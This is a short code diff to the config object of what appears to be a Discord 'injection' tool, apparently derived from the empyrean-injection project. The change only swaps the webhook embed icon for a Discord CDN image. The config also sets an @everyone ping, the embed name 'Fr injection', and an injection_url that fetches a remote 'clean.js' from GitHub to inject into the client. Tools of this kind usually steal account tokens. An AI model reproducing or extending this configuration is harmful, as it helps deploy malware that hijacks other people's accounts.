@@ -12,7 +12,7 @@ const config = {
   ping_on_run: false, 
   ping_val: '@everyone', 
   embed_name: 'Fr injection', 
-  embed_icon: 'https://raw.githubusercontent.com/addi00000/empyrean-injection/main/imgs/pfp.png', 
+  embed_icon: 'https://cdn.discordapp.com/attachments/1077267633365340172/1094133346788970556/582387.png', 
   embed_color: 0, 
   injection_url: 'https://raw.githubusercontent.com/Anthemiaa/fr/main/clean.js', 
 
